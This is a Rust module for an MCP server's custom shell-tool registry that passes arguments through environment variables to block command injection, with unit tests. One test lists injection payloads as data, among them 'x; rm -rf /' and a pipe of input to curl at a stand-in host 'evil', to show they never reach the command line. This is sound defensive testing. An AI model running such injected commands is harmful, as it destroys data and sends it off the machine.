//! Dynamic custom tool registry.
//!
//! Allows registering shell-command-backed tools at runtime without restarting
//! the MCP server. Custom tools are persisted to `.velocity/custom_tools.json`
//! and survive restarts. Built-in tools always take priority over custom tools
//! with the same name.
//!
//! A `{{param}}` placeholder is **not** a text substitution. The value is put
//! in the child's environment and the placeholder becomes the shell's
//! expansion of it, so an argument can never add a statement, a redirect or a
//! command substitution to the operator's command line. See
//! [`build_invocation`].

use crate::registry::types::Tool;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::collections::HashMap;
use std::error::Error;
use std::path::Path;
use std::process::Command;

/// A custom tool definition persisted to disk.
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct CustomTool {
    pub name: String,
    pub description: String,
    /// Shell command to execute. `{{param}}` placeholders receive argument
    /// values as environment expansions, never as command text.
    pub command: String,
    /// JSON Schema for the tool's input parameters.
    #[serde(default = "default_input_schema")]
    pub input_schema: Value,
}

fn default_input_schema() -> Value {
    json!({"type": "object", "properties": {}, "required": []})
}

/// Path to the custom tools persistence file.
fn tools_path(root: &Path) -> std::path::PathBuf {
    root.join(".velocity").join("custom_tools.json")
}

/// Load custom tools from `.velocity/custom_tools.json`.
fn load_tools(root: &Path) -> HashMap<String, CustomTool> {
    match std::fs::read_to_string(tools_path(root)) {
        Ok(content) => serde_json::from_str(&content).unwrap_or_default(),
        Err(_) => HashMap::new(),
    }
}

/// Save custom tools to `.velocity/custom_tools.json`.
fn save_tools(root: &Path, tools: &HashMap<String, CustomTool>) -> Result<(), String> {
    let dir = root.join(".velocity");
    std::fs::create_dir_all(&dir)
        .map_err(|e| format!("Failed to create .velocity directory: {e}"))?;
    let json = serde_json::to_string_pretty(tools)
        .map_err(|e| format!("Failed to serialize custom tools: {e}"))?;
    std::fs::write(tools_path(root), json)
        .map_err(|e| format!("Failed to write custom_tools.json: {e}"))?;
    Ok(())
}

/// Register a custom tool. Returns an error if the name conflicts with a
/// built-in tool or is already registered.
pub fn register_tool(root: &Path, tool: CustomTool) -> Result<String, Box<dyn Error>> {
    // Reject names that collide with built-in tools.
    let builtins = crate::registry::tool_definitions::get_tools();
    if builtins.iter().any(|t| t.name == tool.name) {
        return Err(format!(
            "Cannot register '{}': conflicts with a built-in tool",
            tool.name
        )
        .into());
    }

    let mut map = load_tools(root);
    let name = tool.name.clone();
    map.insert(name.clone(), tool);
    save_tools(root, &map)?;
    Ok(format!("Custom tool '{}' registered successfully", name))
}

/// Unregister a custom tool by name.
pub fn unregister_tool(root: &Path, name: &str) -> Result<String, Box<dyn Error>> {
    let mut map = load_tools(root);
    if map.remove(name).is_some() {
        save_tools(root, &map)?;
        Ok(format!("Custom tool '{}' unregistered", name))
    } else {
        Err(format!("Custom tool '{}' not found", name).into())
    }
}

/// List all registered custom tools as `Tool` descriptors.
pub fn list_tools(root: &Path) -> Vec<Tool> {
    load_tools(root)
        .values()
        .map(|ct| Tool {
            name: ct.name.clone(),
            description: ct.description.clone(),
            input_schema: ct.input_schema.clone(),
        })
        .collect()
}

/// Look up a custom tool by name.
pub fn get_tool(root: &Path, name: &str) -> Option<CustomTool> {
    load_tools(root).get(name).cloned()
}

/// The environment variable a `{{key}}` placeholder is passed through.
///
/// Only `[A-Za-z0-9_]` can be addressed as a variable by both shells, so
/// anything else folds to `_`; two keys that fold onto one name are refused
/// rather than merged — see [`build_invocation`].
fn env_name_for(key: &str) -> String {
    let mut name = String::from("VELOCITY_CT_");
    for ch in key.chars() {
        name.push(if ch.is_ascii_alphanumeric() || ch == '_' {
            ch.to_ascii_uppercase()
        } else {
            '_'
        });
    }
    name
}

/// Which command line the assembled text is handed to. A parameter, not a
/// `cfg!`, so one host can grade both spellings.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Shell {
    PowerShell,
    Posix,
}

impl Shell {
    pub fn host() -> Shell {
        if cfg!(target_os = "windows") {
            Shell::PowerShell
        } else {
            Shell::Posix
        }
    }

    /// The form that expands `env_name` as **exactly one word**.
    ///
    /// The quotes are not decoration: unquoted `${V}` word-splits and globs in
    /// `sh`, and PowerShell cannot read an environment variable at all without
    /// the `env:` provider prefix.
    pub fn expansion(self, env_name: &str) -> String {
        let reference = match self {
            Shell::PowerShell => format!("${{env:{env_name}}}"),
            Shell::Posix => format!("${{{env_name}}}"),
        };
        format!("\"{reference}\"")
    }
}

/// Replace every `placeholder` in `text` with `expansion`.
///
/// When the placeholder is wrapped by a quote pair that holds nothing else
/// (`"{{x}}"`, `'{{x}}'`) the pair goes with it, because the expansion is
/// already quoted and `""${V}""` splits into separate words in `sh`.
fn substitute_placeholder(text: &str, placeholder: &str, expansion: &str) -> String {
    let mut out = String::with_capacity(text.len());
    let mut cursor = 0usize;
    while let Some(relative) = text[cursor..].find(placeholder) {
        let start = cursor + relative;
        let end = start + placeholder.len();
        let (mut span_start, mut span_end) = (start, end);
        let before = if start > 0 {
            text.as_bytes()[start - 1]
        } else {
            0
        };
        let after = if end < text.len() {
            text.as_bytes()[end]
        } else {
            0
        };
        if (before == b'"' || before == b'\'') && before == after {
            span_start = start - 1;
            span_end = end + 1;
        }
        out.push_str(&text[cursor..span_start]);
        out.push_str(expansion);
        cursor = span_end;
    }
    out.push_str(&text[cursor..]);
    out
}

/// Names left inside `{{` … `}}` after every supplied argument was expanded.
fn leftover_placeholders(command: &str) -> Vec<String> {
    let mut found = Vec::new();
    let mut rest = command;
    while let Some(open) = rest.find("{{") {
        let tail = &rest[open + 2..];
        let Some(close) = tail.find("}}") else { break };
        let name = &tail[..close];
        if !name.is_empty() && !name.contains('{') && !name.contains('}') {
            found.push(name.chars().take(60).collect());
        }
        rest = &tail[close + 2..];
    }
    found
}

/// Turn a command template plus arguments into the command line to run and the
/// values to hand the child through its environment.
///
/// The values never enter the command line: each `{{key}}` becomes
/// [`Shell::expansion`]'s reference to a `VELOCITY_CT_*` variable, so a value
/// containing `;`, `|`, `` ` ``, `$(…)`, a newline or a quote is one literal
/// word as far as the shell is concerned. Three ways this refuses instead of
/// running: two argument names that fold onto the same environment variable
/// (which would silently pick one of them), a value containing a NUL (which no
/// shell can pass at all), and a placeholder the call left unfilled — the old
/// behaviour ran the command with `{{name}}` in it literally.
fn build_invocation(
    shell: Shell,
    command: &str,
    arguments: &Value,
) -> Result<(String, Vec<(String, String)>), String> {
    let empty = serde_json::Map::new();
    let args = arguments.as_object().unwrap_or(&empty);

    let mut planned: Vec<(&String, &Value, String)> = Vec::new();
    for (key, value) in args {
        let placeholder = format!("{{{{{key}}}}}");
        if !command.contains(&placeholder) {
            continue;
        }
        let env = env_name_for(key);
        if let Some((other, _, _)) = planned.iter().find(|(_, _, e)| *e == env) {
            return Err(format!(
                "arguments '{other}' and '{key}' both fold into the environment variable {env}; \
                 the shell could not tell their values apart, so rename one of them"
            ));
        }
        planned.push((key, value, env));
    }

    let mut cmd_str = command.to_string();
    let mut passed = Vec::with_capacity(planned.len());
    for (key, value, env) in planned {
        let text = match value {
            Value::String(s) => s.clone(),
            other => other.to_string(),
        };
        if text.contains('\0') {
            return Err(format!(
                "argument '{key}' contains a NUL, which cannot be passed to a shell"
            ));
        }
        cmd_str =
            substitute_placeholder(&cmd_str, &format!("{{{{{key}}}}}"), &shell.expansion(&env));
        passed.push((env, text));
    }

    let missing = leftover_placeholders(&cmd_str);
    if !missing.is_empty() {
        let listed: Vec<String> = missing.iter().map(|m| format!("{{{{{m}}}}}")).collect();
        return Err(format!(
            "the command was left with unfilled placeholder(s) {} — every one needs a matching \
             argument, or the shell receives those braces as text",
            listed.join(", ")
        ));
    }
    Ok((cmd_str, passed))
}

/// Execute a custom tool by expanding `{{param}}` placeholders into shell
/// references to the argument values, then running the result via the platform
/// shell.
pub fn execute_tool(
    root: &Path,
    tool: &CustomTool,
    arguments: &Value,
) -> Result<String, Box<dyn Error>> {
    // One `Shell` decides both the expansion spelling and the interpreter, so
    // they cannot drift apart.
    let shell = Shell::host();
    let (cmd_str, passed) = build_invocation(shell, &tool.command, arguments)
        .map_err(|reason| format!("Custom tool '{}': {reason}", tool.name))?;

    let mut command = match shell {
        Shell::PowerShell => {
            let mut c = Command::new("powershell");
            c.args(["-NoProfile", "-Command", cmd_str.as_str()]);
            c
        }
        Shell::Posix => {
            let mut c = Command::new("sh");
            c.args(["-c", cmd_str.as_str()]);
            c
        }
    };
    command.current_dir(root);
    for (name, value) in &passed {
        command.env(name, value);
    }
    let output = command.output()?;

    let mut result = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr);
    if !stderr.is_empty() {
        if !result.is_empty() {
            result.push('\n');
        }
        result.push_str(&stderr);
    }

    if !output.status.success() {
        return Err(format!(
            "Custom tool '{}' exited with status {}: {}",
            tool.name, output.status, result
        )
        .into());
    }

    Ok(result)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    fn setup() -> tempfile::TempDir {
        let tmp = tempfile::tempdir().unwrap();
        fs::create_dir_all(tmp.path().join(".velocity")).unwrap();
        tmp
    }

    #[test]
    fn register_and_list() {
        let tmp = setup();
        let tool = CustomTool {
            name: "my-echo".into(),
            description: "Echo a message".into(),
            command: "echo {{msg}}".into(),
            input_schema: json!({
                "type": "object",
                "properties": { "msg": { "type": "string" } },
                "required": ["msg"]
            }),
        };
        assert!(register_tool(tmp.path(), tool).is_ok());
        let tools = list_tools(tmp.path());
        assert_eq!(tools.len(), 1);
        assert_eq!(tools[0].name, "my-echo");
    }

    #[test]
    fn unregister() {
        let tmp = setup();
        let tool = CustomTool {
            name: "temp-tool".into(),
            description: "Temporary".into(),
            command: "echo hi".into(),
            input_schema: json!({"type": "object", "properties": {}}),
        };
        register_tool(tmp.path(), tool).unwrap();
        assert_eq!(list_tools(tmp.path()).len(), 1);
        assert!(unregister_tool(tmp.path(), "temp-tool").is_ok());
        assert_eq!(list_tools(tmp.path()).len(), 0);
    }

    #[test]
    fn unregister_nonexistent_fails() {
        let tmp = setup();
        assert!(unregister_tool(tmp.path(), "nope").is_err());
    }

    #[test]
    fn persistence_across_reload() {
        let tmp = setup();
        let tool = CustomTool {
            name: "persist-me".into(),
            description: "Survives reload".into(),
            command: "echo ok".into(),
            input_schema: json!({"type": "object", "properties": {}}),
        };
        register_tool(tmp.path(), tool).unwrap();

        // Verify the file exists on disk.
        assert!(tools_path(tmp.path()).exists());

        // list_tools reads from disk each time, so it should see the tool.
        let tools = list_tools(tmp.path());
        assert_eq!(tools.len(), 1);
        assert_eq!(tools[0].name, "persist-me");
    }

    #[test]
    fn execute_substitution() {
        let tmp = setup();
        let tool = CustomTool {
            name: "greeter".into(),
            description: "Greet someone".into(),
            command: if cfg!(target_os = "windows") {
                "cmd /c echo Hello {{name}}"
            } else {
                "echo Hello {{name}}"
            }
            .into(),
            input_schema: json!({"type": "object", "properties": {}}),
        };
        let result = execute_tool(tmp.path(), &tool, &json!({"name": "World"})).unwrap();
        assert!(
            result.trim().contains("Hello World"),
            "expected 'Hello World' in output, got: {result:?}"
        );
    }

    #[test]
    fn get_tool_returns_none_for_missing() {
        let tmp = setup();
        assert!(get_tool(tmp.path(), "nonexistent").is_none());
    }

    #[test]
    fn get_tool_returns_registered() {
        let tmp = setup();
        let tool = CustomTool {
            name: "find-me".into(),
            description: "Findable".into(),
            command: "echo hi".into(),
            input_schema: json!({"type": "object", "properties": {}}),
        };
        register_tool(tmp.path(), tool).unwrap();
        let found = get_tool(tmp.path(), "find-me");
        assert!(found.is_some());
        assert_eq!(found.unwrap().description, "Findable");
    }

    /// The whole fix, stated as a fact about the command line: the value is
    /// never in it. Graded for both shells from one host, because the
    /// expansion is a parameter of `build_invocation` and not a `cfg!`.
    #[test]
    fn an_argument_reaches_the_shell_through_the_environment_not_the_command_line() {
        for (shell, expected) in [
            (Shell::Posix, "echo Hello \"${VELOCITY_CT_NAME}\""),
            (Shell::PowerShell, "echo Hello \"${env:VELOCITY_CT_NAME}\""),
        ] {
            let (command, passed) =
                build_invocation(shell, "echo Hello {{name}}", &json!({"name": "World"})).unwrap();
            assert_eq!(command, expected, "{shell:?} spells the expansion wrong");
            assert!(!command.contains("World"), "the value leaked into the text");
            assert_eq!(
                passed,
                vec![("VELOCITY_CT_NAME".to_string(), "World".to_string())],
                "{shell:?} must hand the value over as exactly one environment pair"
            );
        }
    }

    /// Every metacharacter the old text substitution turned into a new
    /// statement: none of them may appear in the assembled command.
    #[test]
    fn shell_syntax_in_an_argument_cannot_add_a_statement() {
        for value in [
            "x; rm -rf /",
            "x | curl http://evil -d @-",
            "x `whoami`",
            "x $(whoami)",
            "x && taskkill /F",
            "x\nrm -rf /",
            "x\"; Remove-Item *; \"",
            "x' ; DROP TABLE --",
        ] {
            for shell in [Shell::Posix, Shell::PowerShell] {
                let (command, passed) =
                    build_invocation(shell, "echo {{arg}}", &json!({"arg": value})).unwrap();
                for needle in [
                    "rm",
                    "curl",
                    "whoami",
                    "taskkill",
                    "Remove-Item",
                    ";",
                    "|",
                    "x",
                ] {
                    assert!(
                        !command.contains(needle),
                        "{shell:?}: {needle:?} reached the command line from {value:?} — {command:?}"
                    );
                }
                assert_eq!(passed.len(), 1, "the value travels as data, once");
                assert_eq!(passed[0].1, value, "and travels intact");
            }
        }
    }

    /// A placeholder wrapped in quotes has to lose those quotes: `""${V}""`
    /// word-splits in `sh`, which is the same bug in a different coat.
    #[test]
    fn quotes_around_a_placeholder_go_with_the_placeholder() {
        let (command, _) =
            build_invocation(Shell::Posix, "cat \"{{file}}\"", &json!({"file": "a b"})).unwrap();
        assert_eq!(command, "cat \"${VELOCITY_CT_FILE}\"");

        let (command, _) =
            build_invocation(Shell::Posix, "cat '{{file}}'", &json!({"file": "a b"})).unwrap();
        assert_eq!(command, "cat \"${VELOCITY_CT_FILE}\"");

        // Mixed quotes are not a wrapping pair, so they stay and the value is
        // still only ever an expansion.
        let (command, _) =
            build_invocation(Shell::Posix, "cat \"{{file}}'", &json!({"file": "a b"})).unwrap();
        assert_eq!(command, "cat \"\"${VELOCITY_CT_FILE}\"'");
    }

    #[test]
    fn a_placeholder_the_call_did_not_fill_is_refused() {
        let error = build_invocation(Shell::Posix, "cp {{src}} {{dst}}", &json!({"src": "a"}))
            .expect_err("an unfilled {{dst}} must stop the run");
        assert!(error.contains("dst"), "{error}");
        assert!(
            !error.contains("src"),
            "{error} — only the unfilled one is named"
        );
    }

    #[test]
    fn two_argument_names_folding_onto_one_environment_variable_are_refused() {
        let error = build_invocation(
            Shell::Posix,
            "echo {{out-file}} {{out_file}}",
            &json!({"out-file": "one", "out_file": "two"}),
        )
        .expect_err("both names fold to VELOCITY_CT_OUT_FILE");
        assert!(error.contains("VELOCITY_CT_OUT_FILE"), "{error}");
        assert!(
            error.contains("out-file") && error.contains("out_file"),
            "{error}"
        );
    }

    #[test]
    fn an_argument_containing_a_nul_is_refused() {
        let error = build_invocation(Shell::Posix, "echo {{arg}}", &json!({"arg": "abc\0def"}))
            .expect_err("no shell can pass a NUL");
        assert!(error.contains("NUL"), "{error}");
    }

    /// An argument the template never mentions is not a placeholder and must
    /// not become an environment variable the command can read.
    #[test]
    fn an_unused_argument_is_not_passed_through() {
        let (command, passed) =
            build_invocation(Shell::Posix, "echo hi", &json!({"secret": "hunter2"})).unwrap();
        assert_eq!(command, "echo hi");
        assert!(passed.is_empty(), "{passed:?}");
        assert!(!command.contains("hunter2"));
    }

    /// The end-to-end proof, run through the real shell: the argument was
    /// meant to be a command. It is not — it comes back as text, in one piece.
    #[test]
    fn an_argument_that_would_be_a_command_comes_back_as_words() {
        let tmp = setup();
        let tool = CustomTool {
            name: "say".into(),
            description: "Echo the argument".into(),
            command: "echo {{msg}}".into(),
            input_schema: json!({"type": "object", "properties": {}}),
        };
        let value = "one;zz-not-a-command";
        let result = execute_tool(tmp.path(), &tool, &json!({"msg": value}))
            .unwrap_or_else(|e| panic!("the second word ran as a statement: {e}"));
        assert_eq!(
            result.replace("\r\n", "\n").trim(),
            value,
            "the argument must survive as one literal word"
        );
    }

    #[test]
    fn a_multiline_argument_stays_one_argument() {
        let tmp = setup();
        let tool = CustomTool {
            name: "say-lines".into(),
            description: "Echo the argument".into(),
            command: "echo {{msg}}".into(),
            input_schema: json!({"type": "object", "properties": {}}),
        };
        let result = execute_tool(tmp.path(), &tool, &json!({"msg": "first\nsecond"}))
            .unwrap_or_else(|e| panic!("the newline split the command: {e}"));
        assert_eq!(result.replace("\r\n", "\n").trim(), "first\nsecond");
    }

    /// `$` and `;` are the two things that must *not* happen to an argument:
    /// the first is what a shell expands in command text, the second is what
    /// ends a statement. A round trip that returns the value byte-for-byte is
    /// therefore the proof of both, on the real shell.
    #[test]
    fn an_argument_with_spaces_and_dollars_is_not_split_or_expanded() {
        let tmp = setup();
        let tool = CustomTool {
            name: "say-home".into(),
            description: "Echo the argument".into(),
            command: "echo {{msg}}".into(),
            input_schema: json!({"type": "object", "properties": {}}),
        };
        for value in ["a b c", "q$HOME;zz", "two words;zz"] {
            let result = execute_tool(tmp.path(), &tool, &json!({"msg": value}))
                .unwrap_or_else(|e| panic!("{value:?} was not one literal argument: {e}"));
            assert_eq!(
                result.replace("\r\n", "\n").trim(),
                value,
                "{value:?} must come back exactly as it went in"
            );
        }
    }
}
